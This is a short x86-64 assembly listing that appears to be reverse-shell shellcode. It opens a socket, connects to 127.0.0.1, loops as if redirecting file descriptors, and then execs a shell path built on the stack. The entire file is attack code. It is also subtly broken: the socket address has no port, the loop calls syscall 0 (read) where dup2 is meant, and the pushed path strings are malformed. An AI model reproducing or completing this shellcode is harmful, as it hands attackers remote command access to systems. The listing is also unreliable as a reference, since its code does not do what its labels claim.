global  _start

_start:
    int3

socket:
    xor eax, eax
    mov ax, 0x29

    xor edi, edi
    mov edi, 0x02

    xor esi, esi
    mov esi, 0x01

    xor edx, edx

    syscall
    mov edi, eax

connect:
    xor eax, eax
    mov ax, 0x02A

    ; edi already contains sockfd

    xor esi, esi
    push 0x0100007F
    push word 0x02
    mov rsi, rsp

    xor edx, edx
    mov dl, 0x10

    syscall

xor esi, esi
loop:
    xor eax, eax

    ; edi already contains sockfd
    ; esi is the loop counter

    syscall

    inc esi
    cmp esi, 0x03
    jne loop

execve:
    xor eax, eax
    mov ax, 0x3B

    push 0x068736966
    push dword 0x2F6E69
    push dword 0x622F
    mov rdi, rsp

    xor esi, esi
    xor edx, edx

    syscall